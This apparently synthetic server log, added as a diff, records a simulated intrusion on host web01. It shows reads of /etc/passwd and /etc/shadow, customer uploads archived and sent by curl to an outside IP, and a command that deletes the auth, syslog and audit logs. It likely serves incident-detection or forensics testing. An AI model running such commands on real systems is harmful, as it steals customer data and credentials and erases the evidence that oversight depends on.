@@ -1,0 +1,9 @@
+2026-05-15T09:58:01 web01 systemd[1]: Started Apache HTTP Server.
+2026-05-15T09:58:22 web01 cron[1201]: (root) CMD (/usr/local/bin/backup-health-check)
+May 15 10:08:44 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC=198.51.100.23 DST=10.10.5.15 LEN=60 PROTO=TCP SPT=53200 DPT=22
+May 15 10:10:55 web01 auditd: type=SYSCALL msg=audit(1778849455.122:91): comm="cat" name="/etc/passwd" exe="/usr/bin/cat"
+May 15 10:11:01 web01 auditd: type=SYSCALL msg=audit(1778849461.220:92): comm="cat" name="/etc/shadow" exe="/usr/bin/cat"
+May 15 10:12:15 web01 bash[4481]: deploy ran tar -czf /tmp/customer_backup.exfil /var/www/html/uploads /etc/nginx/sites-enabled
+May 15 10:12:34 web01 bash[4488]: deploy ran curl -k https://203.0.113.88:9001/upload -F file=@/tmp/customer_backup.exfil
+May 15 10:13:22 web01 bash[4510]: rm -f /var/log/auth.log /var/log/syslog /var/log/audit.log
+May 15 10:14:02 web01 rsyslogd: imjournal: journal files changed, reloading
